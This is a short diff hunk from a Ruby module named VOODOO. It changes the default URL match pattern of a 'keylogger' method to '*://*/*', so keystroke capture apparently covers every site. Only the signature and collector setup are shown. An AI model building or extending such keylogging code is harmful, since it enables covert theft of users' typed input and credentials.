@@ -29,7 +29,7 @@ module VOODOO
             self
         end
 
-        def keylogger(matches: [], url_include: '')
+        def keylogger(matches: '*://*/*', url_include: '')
             collector = Collector.new
             collector.on_json {|jsond| yield jsond }
             
